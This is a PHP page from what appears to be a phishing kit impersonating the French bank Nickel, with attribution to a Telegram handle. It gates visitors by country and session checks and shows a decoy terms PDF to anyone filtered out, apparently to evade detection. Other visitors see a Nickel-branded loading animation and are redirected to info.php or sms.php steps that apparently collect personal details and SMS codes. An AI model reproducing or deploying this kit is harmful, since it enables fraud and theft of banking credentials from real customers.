
<?php
/**
 * 
 * 
 * @package Function and object class Tools
 * @version 1.3.0
 * @last-modified February 11, 2022
 * @author MSbou ELGHO3T
 * @copyright Copyright (c) 2022, anon
 * @link https://t.me/MarcoSbou_sp
 * 
 * 
 */
/**
 * Powered By ElGHO3T
 */
$fine = "page";

(@require_once './init.php') or die("You not have permisions");
if (!defined('ELGHO3T_AB_ROOT')) {die("You not have permisions");}
if(!isset($_SESSION['bid'])){die("You not have permisions");}
if(GHOST_CONSTRICT == true){die("Contact admin @ELGHO3T");exit();}
$Xtools = new Tools();
if(GHOST_limet == true):
    if($Xtools->Check_User_limet() == true):
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        // die("Contact admin limet action @ELGHO3T");
        exit();
    endif;

endif;
file_get_contents('anti.php');
if(GHOST_SECURE == true):

    if(strtolower( $_SESSION['data_info']['country'] ) !== GHOST_COUNTRY ):
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        // die("Contact admin @ELGHO3T");
        exit();
    endif;

    if($Xtools->check_validate($_SESSION['data_info']) !== true):
        // die("Contact admin @ELGHO3T");
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        exit();
    endif;

endif;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="shortcut icon" href="./layout/img/favicon.png" />
    <style>
    @-webkit-keyframes fpFadeInDown{0%{opacity:0;transform:translate3d(0,-20px,0)}to{opacity:1;transform:translateZ(0)}}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}html{-ms-overflow-style:scrollbar}*,*:before,*:after{box-sizing:inherit}
    @-webkit-keyframes db-spinner-animation{0%{opacity:0}.1%{opacity:1}to{opacity:0}}
    @-webkit-keyframes db-spinner-animation-rotator{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
    @-webkit-keyframes db-spinner-animation-dash{0%{stroke-dashoffset:265}50%{stroke-dashoffset:65;transform:rotate(90deg)}to{stroke-dashoffset:265;transform:rotate(360deg)}}.app-loading-pulsing{-webkit-animation-name:pulse;-webkit-animation-timing-function:ease-in-out;-webkit-animation-iteration-count:infinite;-webkit-animation-duration:1.5s;-webkit-animation-delay:.4s;-webkit-animation-fill-mode:both}
    @-webkit-keyframes pulse{0%{transform:translate(-50%,-50%) scaleZ(1)}50%{transform:translate(-50%,-50%) scale3d(1.15,1.15,1.15)}to{transform:translate(-50%,-50%) scaleZ(1)}}@keyframes pulse{0%{transform:translate(-50%,-50%) scaleZ(1)}50%{transform:translate(-50%,-50%) scale3d(1.15,1.15,1.15)}to{transform:translate(-50%,-50%) scaleZ(1)}}
    .locas{
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        /* background-color: red; */
        z-index: 9999;
    }
    .henas{
        position: relative;
        width: 100%;
        float: left;
        height: 100%;
        /* background-color: blue; */
    }
    .contosa{
        overflow: hidden;
    }
    .lifihe{
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #e5d7d7;
        opacity: .5;
        z-index: 1;
    }
    .dakchi{
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 2;
        /* background-color: red; */
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .cadras{
        width: 52%;
        height: 60%;
        background-color: #fff;
        border: 10px solid black;
        padding: 40px 30px;
    }
    .henoos{
        position: relative;
        width: 100%;
        text-align: center;
    }
    .buttona{
        width: 100%;
        text-align: center;
    }
    .app-loading-pulsing {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%,-50%);
            width: 230px;
            height: 160px;
            display: block;
            background-image: url(https://upload.wikimedia.org/wikipedia/fr/thumb/2/2b/Nickel-logo.svg/1200px-Nickel-logo.svg.png);
            background-size: 100%;
            background-repeat: no-repeat;
            -webkit-animation-name: pulse;
            animation-name: pulse;
            -webkit-animation-timing-function: ease-in-out;
            animation-timing-function: ease-in-out;
            -webkit-animation-iteration-count: infinite;
            animation-iteration-count: infinite;
            -webkit-animation-duration: 1.5s;
            animation-duration: 1.5s;
            -webkit-animation-delay: .4s;
            animation-delay: .4s;
            -webkit-animation-fill-mode: both !important;
            animation-fill-mode: both;
        }
    @media only screen and (max-width: 600px) {
        .cadras{
            height: 70% !important;
            width: 80% !important;
            padding: 78px 15px;
            
        }
    }

    /* font-size: 50px;
    font-family: "CalibreBold",Helvetica,Arial,sans-serif;
    font-weight: 700;
    font-style: normal;
    text-transform: uppercase;
    padding-bottom: 6px;
    color: #fff; */

    </style>


</head>
<body>
    <div class="contents">
        <div class="app-loading-pulsing"></div>
    </div>

</body>

<?php

if (isset($_GET['step']) && $_GET['step'] == "2" && isset($_GET['start']) && $_GET['start'] == "true"):
    echo '<script>setTimeout(() => {window.location.href = "./sms.php?cheking=pass&id='.$Xtools->randoms_string(28).'";}, 2000);</script>';
else:
    echo '<script>setTimeout(() => {window.location.href = "./info.php?cheking=pass&id='.$Xtools->randoms_string(28).'";}, 2000);</script>';

endif;

?>

<!-- <script>setTimeout(() => {window.location.href = "./info.php?cheking=pass&id=<?php echo $Xtools->randoms_string(28);?>";}, 2000);</script> -->


</html>